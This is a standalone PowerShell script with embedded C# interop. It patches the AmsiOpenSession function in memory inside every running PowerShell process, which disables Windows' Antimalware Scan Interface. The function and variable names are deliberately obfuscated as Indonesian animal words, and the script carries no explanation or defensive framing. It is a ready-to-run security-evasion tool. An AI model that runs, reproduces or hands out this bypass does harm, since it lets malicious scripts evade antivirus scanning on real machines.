Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Komodo
{
    public const int Gajah = 0x0008;
    public const int Harimau = 0x0010;
    public const int Kuda = 0x0020;
    public const uint Buaya = 0x40;

    [DllImport("ntdll.dll")]
    public static extern int Panda(out IntPtr Srigala, uint Ular, [In] ref Kucing Ikan, [In] ref Elang Zebra);

    [DllImport("ntdll.dll")]
    public static extern int LumbaLumba(IntPtr Srigala, IntPtr Jerapah, byte[] Zebra, uint Badak, out uint Tupai);

    [DllImport("ntdll.dll")]
    public static extern int Bunglon(IntPtr Srigala);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr Iguana(string Beruang);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr Koala(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool Kelinci(IntPtr Srigala, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint Lalat);

    [StructLayout(LayoutKind.Sequential)]
    public struct Kucing
    {
        public int Kambing;
        public IntPtr Anjing;
        public IntPtr Macan;
        public int Tikus;
        public IntPtr KupuKupu;
        public IntPtr Serigala;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct Elang
    {
        public IntPtr BurungHantu;
        public IntPtr Katak;
    }
}
"@

function UbahAyam {
    param (
        [int]$Domba
    )

    $Bebek = [byte]0xEB  

    $Gorila = New-Object Komodo+Kucing
    $Zebra = New-Object Komodo+Elang
    $Zebra.BurungHantu = [IntPtr]$Domba
    $Zebra.Katak = [IntPtr]::Zero
    $Gorila.Kambing = [System.Runtime.InteropServices.Marshal]::SizeOf($Gorila)

    $Srigala = [IntPtr]::Zero
    $status = [Komodo]::Panda([ref]$Srigala, [Komodo]::Gajah -bor [Komodo]::Harimau -bor [Komodo]::Kuda, [ref]$Gorila, [ref]$Zebra)

    if ($status -ne 0) {
        return
    }

    $Cacing = [Komodo]::Iguana("amsi.dll")
    if ($Cacing -eq [IntPtr]::Zero) {
        [Komodo]::Bunglon($Srigala)
        return
    }

    $Ular = [Komodo]::Koala($Cacing, "AmsiOpenSession")
    if ($Ular -eq [IntPtr]::Zero) {
        [Komodo]::Bunglon($Srigala)
        return
    }

    $Hiu = [IntPtr]($Ular.ToInt64() + 3)

    $Badak = [UInt32]0
    $Lumba = [UIntPtr]::new(1)  
    $LabaLaba = [Komodo]::Kelinci($Srigala, $Hiu, $Lumba, [Komodo]::Buaya, [ref]$Badak)

    if (-not $LabaLaba) {
        [Komodo]::Bunglon($Srigala)
        return
    }

    $Tupai = [System.UInt32]0
    $status = [Komodo]::LumbaLumba($Srigala, $Hiu, [byte[]]@($Bebek), 1, [ref]$Tupai)

    [Komodo]::Kelinci($Srigala, $Hiu, $Lumba, $Badak, [ref]$Badak)
    [Komodo]::Bunglon($Srigala)
}

function UbahSemuaKucing {
    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
        UbahAyam -Domba $_.Id
    }
}

UbahSemuaKucing
Write-Host "Mantap kali"
